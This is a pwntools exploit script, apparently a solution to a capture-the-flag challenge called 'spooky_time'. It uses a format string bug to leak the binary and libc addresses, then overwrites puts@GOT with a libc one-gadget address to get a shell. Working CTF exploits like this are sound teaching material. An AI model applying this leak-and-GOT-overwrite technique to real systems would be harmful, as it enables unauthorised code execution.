#!/usr/bin/env python3

from pwn import *

e = ELF("./spooky_time_patched")
libc = ELF('./glibc/libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      b *(main+0x73)
                      b *(main+0xd2)
                      b *(main+0xfc)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # FSB to leak addresses and use %n to overwrite content
    # +
    # ONE GADGET!!!

    # The following payload may need to be run several times to get it work.

    # !!! Note that we should use gdb.attach() instead of the gdb.debug() otherwise the offsets below will be wrong when in non-debug mode.
    # This is likely due to gdb.debug() will disable ASLR.

    # #(formater) is from the fuzz.py
    r.sendlineafter(b'say something scary!', b'%36$p%49$p')
    r.recvuntil(b'Seriously?? I bet you can do better than ')
    r.recvline()
    data = r.recvline().strip()
    _, tmp_binary_addr, tmp_libc_addr = data.split(b'0x')
    # check the fuzz.py for the offsets.
    binary_addr = int(tmp_binary_addr, 16) - 0x40
    libc_addr = int(tmp_libc_addr, 16) - 0x29d90
    info(f'calculated binary address {hex(binary_addr)}, libc address {hex(libc_addr)}')
    e.address = binary_addr
    libc.address = libc_addr

    # the og_offset is from the `ong_gadget glibc/libc.so.6`. Not everyone works.
    og_offset = 0xebcf5
    og_addr = libc.address + og_offset
    info(f'puts@got is at {hex(e.got.puts)}, one gadget is at {hex(og_addr)}')
    payload = fmtstr_payload(offset=8, writes={
        e.got.puts: og_addr
        })
    # payload = 'AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' # Use this to locate the offset (8).
    r.sendlineafter(b'one more time..', payload)

    r.interactive()

if __name__ == "__main__":
    main()
